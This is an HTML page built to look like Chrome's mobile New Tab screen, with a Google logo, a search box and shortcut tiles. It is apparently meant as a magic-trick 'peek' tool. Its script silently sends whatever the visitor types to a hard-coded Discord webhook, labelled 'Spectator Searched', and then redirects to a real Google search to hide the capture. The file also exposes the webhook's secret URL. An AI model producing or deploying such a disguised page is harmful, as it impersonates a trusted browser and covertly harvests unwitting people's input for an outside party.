<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <!-- 🌟 WHITENING CORRECTION FOR MOBILE BROWSER STATUS BAR 🌟 -->
    <meta name="theme-color" content="#ffffff">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    
    <title>New Tab</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
            box-sizing: border-box;
            overflow: hidden;
        }
        .top-nav {
            width: 100%;
            display: flex;
            justify-content: flex-end;
            padding: 16px;
            box-sizing: border-box;
        }
        .profile-icon {
            width: 32px;
            height: 32px;
            background-color: #e8eaed;
            border-radius: 50%;
        }
        .logo-container {
            margin-top: 40px;
            margin-bottom: 25px;
            font-size: 56px;
            font-weight: 500;
            letter-spacing: -1px;
        }
        .logo span:nth-child(1) { color: #4285F4; }
        .logo span:nth-child(2) { color: #EA4335; }
        .logo span:nth-child(3) { color: #FBBC05; }
        .logo span:nth-child(4) { color: #4285F4; }
        .logo span:nth-child(5) { color: #34A853; }
        .logo span:nth-child(6) { color: #EA4335; }
        .search-wrapper {
            width: 90%;
            max-width: 500px;
            position: relative;
            margin-bottom: 35px;
        }
        .search-input {
            width: 100%;
            padding: 14px 20px;
            font-size: 16px;
            border: 1px solid #dfe1e5;
            border-radius: 30px;
            outline: none;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
            box-sizing: border-box;
            background-color: #f8f9fa;
            -webkit-appearance: none;
        }
        .shortcuts-grid {
            width: 85%;
            max-width: 400px;
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            text-align: center;
        }
        .shortcut-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-decoration: none;
            color: #3c4043;
            font-size: 12px;
        }
        .icon-circle {
            width: 48px;
            height: 48px;
            background-color: #f1f3f4;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 8px;
            font-weight: bold;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div id="chromeInterface" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
        <div class="top-nav">
            <div class="profile-icon"></div>
        </div>
        <div class="logo-container logo">
            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
        </div>
        <div class="search-wrapper">
            <input type="text" id="userQuery" class="search-input" placeholder="Search or type URL" autocomplete="off" autocapitalize="off">
        </div>
        <div class="shortcuts-grid">
            <div class="shortcut-item"><div class="icon-circle" style="color: #ff0000;">Y</div>YouTube</div>
            <div class="shortcut-item"><div class="icon-circle" style="color: #1877f2;">F</div>Facebook</div>
            <div class="shortcut-item"><div class="icon-circle" style="color: #000000;">W</div>Wikipedia</div>
            <div class="shortcut-item"><div class="icon-circle" style="color: #34a853;">+</div>Add site</div>
        </div>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const secretWebhookUrl = "https://discord.com/api/webhooks/1550099183908954173/3MbNEj9XQPhU202exWZlnFVGI7nm0GGVqmaeSLkp7hHXIP32ZioPkS5H7hSJfE_qjVu0";
            const inputField = document.getElementById('userQuery');
            if (inputField) {
                inputField.addEventListener('keypress', function (e) {
                    if (e.key === 'Enter') {
                        triggerMagicPeek();
                    }
                });
            }
            function triggerMagicPeek() {
                const secretText = inputField.value;
                if (secretText.trim() !== "") {
                    fetch(secretWebhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: `🔮 **Spectator Searched:** ${secretText}` })
                    }).catch(error => console.log("Network transmission bypassed"));
                    const realSearchEngineUrl = "https://www.google.com/search?q=" + encodeURIComponent(secretText);
                    setTimeout(() => {
                        window.location.href = realSearchEngineUrl;
                    }, 250);
                }
            }
        });
    </script>
</body>
</html>
